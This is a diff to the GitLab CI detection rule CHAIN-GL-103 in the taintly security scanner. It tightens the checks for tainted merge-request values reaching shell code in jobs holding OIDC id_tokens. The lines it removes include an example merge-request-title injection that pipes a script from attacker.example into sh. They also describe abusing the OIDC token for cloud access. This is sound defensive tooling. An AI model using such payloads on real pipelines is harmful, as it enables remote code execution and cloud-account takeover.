@@ -46,6 +46,7 @@ the corpus" to gate the escalation.
 from __future__ import annotations
 
 import re
+from collections.abc import Sequence
 
 from taintly.gitlab_workflow_corpus import (
     GitLabCorpusFindings,
@@ -336,42 +337,194 @@ def _compose_chain_gl_102(corpus: GitLabWorkflowCorpus) -> GitLabCorpusFindings:
 
 
 def _compose_chain_gl_103(corpus: GitLabWorkflowCorpus) -> GitLabCorpusFindings:
-    """Detect the TAINT-GL-001 + fork-reachable + id_tokens chain.
+    """Compose validated CODE with same-job token and bounded MR-rule context."""
+    from .shell_role import (
+        GitLabShellRole,
+        _profile_paths,
+        _source_profile,
+        classify_gitlab_shallow_use,
+        validate_gitlab_shallow_use,
+    )
 
-    Threat shape: a file contains a tainted-CI-variable laundering
-    shape (TAINT-GL-001: ``$CI_MERGE_REQUEST_TITLE`` flows through a
-    ``variables:`` indirection into an unquoted script reference) AND
-    declares OIDC ``id_tokens:`` AND is fork-reachable.
-
-    Composition: shell-metacharacter injection into the MR title gives
-    the attacker command execution INSIDE a job that holds the OIDC
-    write-token — they can call out to the cloud provider as the
-    project, not just leak local secrets.
-
-    The TAINT-GL-001 single rule already fires on the laundering
-    shape; CHAIN-GL-103 escalates to HIGH (above the single rule's
-    LOW-MEDIUM in some cases) when the id_tokens + fork-reachable
-    preconditions are also present in the same file.
-    """
     findings: GitLabCorpusFindings = []
     for w in corpus.all():
-        if TriggerFamily.FORK_REACHABLE not in w.triggers:
-            continue
-        if w.protected_branch_only or w.bot_gate_pattern:
-            continue
-        if not w.id_tokens_declared:
-            continue
-        has_taint, taint_line = _has_taint_variable_laundering(w)
-        if not has_taint:
-            continue
-        snippet = (
-            "CHAIN-GL-103: tainted-CI-variable laundering shape (TAINT-GL-001) co-occurs "
-            "with OIDC id_tokens declaration and a fork-reachable trigger. Shell "
-            "metacharacter injection via the laundered MR title executes inside a job "
-            "that holds the project's OIDC cloud write-token."
-        )
-        findings.append((w.filepath, taint_line, snippet))
+        profile = _source_profile(w.content, w.filepath)
+        for path in _profile_paths(profile):
+            if path.kind != "shallow" or path.sink_kind != "script":
+                continue
+            evidence = classify_gitlab_shallow_use(w.content, w.filepath, path)
+            if evidence.role is not GitLabShellRole.CODE or not validate_gitlab_shallow_use(
+                evidence, w.content, w.filepath, path.sink_line
+            ):
+                continue
+            owner_job = evidence.owner_path[0] if evidence.owner_path else None
+            matching_jobs = [
+                candidate
+                for candidate in w.job_definitions
+                if candidate.name == owner_job
+                and candidate.line <= path.sink_line < candidate.end_line
+            ]
+            if len(matching_jobs) != 1:
+                continue
+            job = matching_jobs[0]
+            activation = _gl103_mr_activation(w.content, w.filepath, job.name, profile.events)
+            if activation is False:
+                continue
+            # The corpus trigger summary is only a possibility filter when
+            # YAML rules do not resolve activation. It is never proof that a
+            # specific owner job admits merge-request pipelines.
+            if activation is None and TriggerFamily.FORK_REACHABLE not in job.triggers:
+                continue
+            if job.protected_branch_only or job.bot_gate_pattern:
+                continue
+            if not _gl103_has_owned_token_audience(w.content, w.filepath, job.name, profile.events):
+                continue
+            activation_note = (
+                "Supported workflow/owning-job rules do not deny an MR pipeline; actual "
+                "triggering remains unverified."
+                if activation is True
+                else "MR activation for the owning job is unresolved from this YAML; "
+                "the project setting and effective execution remain unverified."
+            )
+            snippet = (
+                "CHAIN-GL-103: tainted value $"
+                f"{path.laundered_var} from ${path.source_var} reaches a supported "
+                "conditional POSIX shell code profile in this job. The same job has "
+                "a structural id_tokens token declaration with a nonempty aud value. "
+                f"{activation_note} Runner behavior, token issuance, federation "
+                "acceptance, and permissions are unverified."
+            )
+            findings.append((w.filepath, path.sink_line, snippet))
+            break
     return findings
+
+
+def _gl103_has_owned_token_audience(
+    content: str,
+    filepath: str,
+    job_name: str,
+    events: Sequence[Event] | None = None,
+) -> bool:
+    """Require a direct owner-job id_tokens token map with nonempty aud."""
+    if events is None:
+        try:
+            events = tuple(
+                walk_workflow(
+                    filepath,
+                    schema="gitlab_ci",
+                    content=content,
+                    include_keys=True,
+                )
+            )
+        except Exception:
+            return False
+    if any(event.kind in {EventKind.CUTOFF, EventKind.ERROR} for event in events):
+        return False
+
+    token_prefix = (job_name, "id_tokens")
+    token_names = {
+        event.path[2]
+        for event in events
+        if event.kind is EventKind.MAP_KEY
+        and len(event.path) == 3
+        and event.path[:2] == token_prefix
+        and isinstance(event.path[2], str)
+        and event.path[2].strip()
+    }
+    if not token_names:
+        return False
+
+    for token_name in token_names:
+        audience_path = token_prefix + (token_name, "aud")
+        audience_key = any(
+            event.kind is EventKind.MAP_KEY and event.path == audience_path for event in events
+        )
+        if not audience_key:
+            continue
+        audience_values = [
+            event.value
+            for event in events
+            if event.kind is EventKind.LEAF_SCALAR
+            and event.path[: len(audience_path)] == audience_path
+            and (
+                event.path == audience_path
+                or (
+                    len(event.path) == len(audience_path) + 1
+                    and isinstance(event.path[-1], int)
+                    and not isinstance(event.path[-1], bool)
+                )
+            )
+        ]
+        if audience_values and all(
+            isinstance(value, str) and value.strip() for value in audience_values
+        ):
+            return True
+    return False
+
+
+def _gl103_mr_activation(
+    content: str,
+    filepath: str,
+    job_name: str,
+    events: Sequence[Event] | None = None,
+) -> bool | None:
+    """Return bounded YAML MR admission for the workflow and exact owner job.
+
+    False means supported rules deny MR activation. True means supported
+    workflow and job rules admit it. None is unresolved, including the
+    default job-rule behavior and external project settings.
+    """
+    if events is None:
+        try:
+            events = tuple(
+                walk_workflow(
+                    filepath,
+                    schema="gitlab_ci",
+                    content=content,
+                    include_keys=True,
+                )
+            )
+        except Exception:
+            return None
+    if any(event.kind in {EventKind.CUTOFF, EventKind.ERROR} for event in events):
+        return None
+
+    workflow_rules_path = ("workflow", "rules")
+    job_rules_path = (job_name, "rules")
+    workflow_rules_present = any(
+        event.kind is EventKind.MAP_KEY and event.path == workflow_rules_path for event in events
+    )
+    job_rules_present = any(
+        event.kind is EventKind.MAP_KEY and event.path == job_rules_path for event in events
+    )
+    unresolved = False
+    # Legacy only/except semantics and project-level defaults are deliberately
+    # not inferred by this bounded rules reader.
+    if any(
+        event.kind is EventKind.MAP_KEY and event.path in {(job_name, "only"), (job_name, "except")}
+        for event in events
+    ):
+        unresolved = True
+
+    if workflow_rules_present:
+        workflow_allowed, _workflow_explicit_mr = _mr_rule_decision(
+            list(events), workflow_rules_path
+        )
+        if workflow_allowed is False:
+            return False
+        if workflow_allowed is None:
+            unresolved = True
+
+    if job_rules_present:
+        job_allowed, _job_explicit_mr = _mr_rule_decision(list(events), job_rules_path)
+        if job_allowed is False:
+            return False
+        if job_allowed is None:
+            unresolved = True
+    else:
+        unresolved = True
+
+    return None if unresolved else True
 
 
 # ---------------------------------------------------------------------------
@@ -486,38 +639,27 @@ RULES: list[Rule] = [
     ),
     Rule(
         id="CHAIN-GL-103",
-        title=(
-            "CHAIN: tainted-variable laundering + fork-reachable + id_tokens "
-            "(injection in OIDC-scoped job)"
-        ),
+        title=("CHAIN: supported shell-code use + possible MR activation + id_tokens (review)"),
         severity=Severity.HIGH,
         platform=Platform.GITLAB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "A file contains a tainted-CI-variable laundering shape (TAINT-GL-001: "
-            "``$CI_MERGE_REQUEST_TITLE`` / ``$CI_COMMIT_MESSAGE`` / etc. assigned into "
-            "a project ``variables:`` entry, then referenced unquoted in a script) "
-            "AND declares OIDC ``id_tokens:`` AND is fork-reachable AND does not "
-            "gate execution to a protected branch or a trusted-bot identity.  "
-            "Composition: an attacker injecting shell metacharacters into the "
-            "laundered CI variable gets command execution inside a job that holds "
-            "the project's OIDC cloud write-token — escalating from 'shell injection "
-            "leaks local secrets' to 'shell injection holds the cloud account'.  "
-            "The single-rule TAINT-GL-001 catches the laundering shape; this CHAIN "
-            "rule escalates when the id_tokens precondition is also present."
+            "A source-bound CI value reaches one supported command-code form in a "
+            "uniquely owned script item under the conditional POSIX shell profile. "
+            "The same job declares ``id_tokens`` with an audience. Supported YAML "
+            "rules may admit an MR pipeline; otherwise activation can remain unresolved "
+            "because default behavior and project settings are outside this analysis. "
+            "This is a conditional review candidate, not proof of fork reachability or "
+            "execution. Runner shell, token issuance or availability, external federation "
+            "acceptance, and cloud permissions are not established."
         ),
         pattern=GitLabCorpusPattern(callback=_compose_chain_gl_103),
         remediation=(
-            "Apply ANY of:\n"
-            "  1. Double-quote every project-variable reference in script lines:\n"
-            '       - echo "$PR_TITLE"\n'
-            "  2. Remove the tainted-variable laundering (do NOT copy\n"
-            "     $CI_MERGE_REQUEST_TITLE / $CI_COMMIT_MESSAGE / etc. into\n"
-            "     project variables when those variables are later referenced\n"
-            "     in shell).\n"
-            "  3. Remove id_tokens from MR-pipeline-reachable jobs so a\n"
-            "     successful injection doesn't hold the OIDC write-token.\n"
-            "Run `taintly --guide CHAIN-GL-103` for the full checklist."
+            "Keep attacker-controlled values as data. Remove eval or interpreter-code "
+            "consumption; quoting alone does not make those uses safe. Review the job's "
+            "trigger conditions and ``id_tokens`` audience separately, then verify "
+            "token issuance, external federation trust, and permissions with the "
+            "relevant provider configuration."
         ),
         reference=(
             "https://docs.gitlab.com/ci/variables/predefined_variables/; "
@@ -527,17 +669,15 @@ RULES: list[Rule] = [
         test_negative=[],
         stride=["T", "E"],
         threat_narrative=(
-            "An attacker opens an MR titled "
-            '``"; curl https://attacker.example/exfil.sh | sh ; #``.  The pipeline '
-            "copies the title into a project variable via the ``variables:`` block "
-            "and a later script line evaluates it unquoted.  The injected command "
-            "runs inside a job that holds the project's OIDC id_tokens — the curl "
-            "fetches a payload that calls the cloud provider's STS endpoint using "
-            "the OIDC token, escalating from project-CI-only access to direct "
-            "cloud-account write."
+            "A job has a source-bound value in a supported conditional POSIX code position "
+            "and declares ``id_tokens``. YAML may admit an MR pipeline or leave its "
+            "activation unresolved. If the job is triggered and the runner interprets "
+            "the value as modeled, code use is a review concern. Token issuance, federation "
+            "acceptance, and permissions remain unverified; the finding does not establish "
+            "fork reachability or cloud access."
         ),
         confidence="medium",
-        review_needed=False,
+        review_needed=True,
         finding_family="script_injection",
     ),
 ]
